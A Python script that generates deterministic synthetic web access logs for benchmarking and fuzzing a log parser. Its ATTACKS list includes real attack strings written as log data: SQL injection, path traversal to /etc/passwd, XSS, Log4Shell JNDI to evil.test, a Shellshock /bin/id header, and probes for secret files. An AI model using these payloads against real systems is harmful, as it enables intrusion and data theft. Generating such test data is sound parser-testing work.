"""Deterministic synthetic access log generator for benchmarks and conformance fuzzing.

    python3 bench/gen_log.py OUT N [--seed 1] [--nasty 0.0]

--nasty is the fraction of lines replaced with hostile or malformed input."""
import random
import sys

PATHS = ["/", "/index.html", "/products", "/products?id=%d", "/cart", "/checkout", "/api/v1/items?page=%d", "/api/v1/users/%d", "/static/app.%d.js", "/static/style.css", "/login", "/search?q=term%d", "/orders/%d", "/health"]
UAS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1", "curl/8.5.0", "python-requests/2.32", "Googlebot/2.1", "k6/0.50"]
ATTACKS = [
    ("/search?q=1%27%20UNION%20SELECT%20password%20FROM%20users--", "Mozilla/5.0"),
    ("/download?file=../../../../etc/passwd", "curl/8.5.0"),
    ("/search?q=<script>alert(1)</script>", "Mozilla/5.0"),
    ("/.env", "Nikto/2.5"),
    ("/wp-config.php.bak", "Mozilla/5.0"),
    ("/p?id=1+OR+1=1", "sqlmap/1.7"),
    ("/", "${jndi:ldap://evil.test/a}"),
    ("/cgi-bin/x", "() { :;}; /bin/id"),
    ("/admin/.git/config", "gobuster/3.6"),
    ("/a?x=%3Cscript%3Ealert(1)", "Mozilla/5.0"),
]
MON = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def ts(rng, base):
    s = base + rng.randrange(0, 86400 * 3)
    d = s // 86400
    return "%02d/%s/2026:%02d:%02d:%02d +0000" % (1 + d % 28, MON[(d // 28) % 12], (s // 3600) % 24, (s // 60) % 60, s % 60)


def line(ip, when, req, status, size, ref, ua):
    return '%s - - [%s] "%s" %d %s "%s" "%s"' % (ip, when, req, status, size, ref, ua)


def nasty(rng, ip, when):
    k = rng.randrange(12)
    if k == 0:
        return b"not a log line at all"
    if k == 1:
        return line(ip, when, "GET / HTTP/1.1", 200, 5, "-", "x").encode()[: rng.randrange(5, 60)]
    if k == 2:
        return line(ip, when.replace("Oct", "Foo").replace("Jan", "Foo"), "GET / HTTP/1.1", 200, 5, "-", "x").encode()
    if k == 3:
        return line(ip, when, "GET /\xff\xfe%ff\x01 HTTP/1.1", 200, 5, "-", "x").encode("latin1")
    if k == 4:
        return line(ip, when, "GET /" + "A" * 9000 + " HTTP/1.1", 200, 5, "-", "x").encode()
    if k == 5:
        return (line(ip, when, "GET /crlf HTTP/1.1", 200, 5, "-", "x") + "\r").encode()
    if k == 6:
        return line(ip, when, 'GET /q?a=%22%5C HTTP/1.1', 200, 5, "-", 'a \\"quoted\\" \\\\ ua').encode()
    if k == 7:
        return line(ip, when, "GET /p?id=100%&x=%2&y=%zz&z=%2b%2B+ HTTP/1.1", 200, 5, "-", "x").encode()
    if k == 8:
        return line(ip, when, "GET / HTTP/1.1", 200, "12x", "-", "x").encode()
    if k == 9:
        return line(ip, when, "-", 400, 0, "-", "-").encode()
    if k == 10:
        return (line(ip, when, "GET /a HTTP/1.1", 200, 5, "-", "x") + " trailing").encode()
    return line("host.example", when, "GET / HTTP/1.1", 200, 5, "-", "x").encode()


def main():
    out, n = sys.argv[1], int(sys.argv[2])
    seed = int(sys.argv[sys.argv.index("--seed") + 1]) if "--seed" in sys.argv else 1
    nasty_frac = float(sys.argv[sys.argv.index("--nasty") + 1]) if "--nasty" in sys.argv else 0.0
    rng = random.Random(seed)
    base = 1788000000
    pool = ["%s.%d.%d" % (rng.choice(["192.0.2", "198.51.100", "203.0.113"]), rng.randrange(256), rng.randrange(256)) for _ in range(20000)]
    pool = [p[: p.rfind(".", 0, p.rfind("."))] + "." + str(rng.randrange(1, 255)) if False else "10.%d.%d.%d" % (i // 65536 % 256, i // 256 % 256, i % 256) for i, p in enumerate(pool)]
    v6 = ["2001:db8::%x" % i for i in range(200)]
    bad = pool[:40]
    with open(out, "wb") as f:
        for i in range(n):
            r = rng.random()
            ip = rng.choice(v6) if rng.random() < 0.01 else rng.choice(pool)
            when = ts(rng, base)
            if nasty_frac and r < nasty_frac:
                f.write(nasty(rng, ip, when) + b"\n")
                continue
            if r < 0.93:
                p = rng.choice(PATHS)
                p = p % rng.randrange(500) if "%d" in p else p
                st = rng.choices([200, 304, 404, 500, 301], [80, 8, 6, 1, 5])[0]
                f.write((line(ip, when, "GET %s HTTP/1.1" % p, st, rng.randrange(0, 90000), rng.choice(["-", "https://shop.test/"]), rng.choice(UAS)) + "\n").encode())
            elif r < 0.97:
                p, ua = rng.choice(ATTACKS)
                f.write((line(rng.choice(bad), when, "GET %s HTTP/1.1" % p, rng.choice([200, 400, 403, 404]), rng.randrange(0, 900), "-", ua) + "\n").encode())
            else:
                f.write((line(rng.choice(bad), when, "POST /login HTTP/1.1", 401, 55, "-", "Mozilla/5.0") + "\n").encode())


if __name__ == "__main__":
    main()
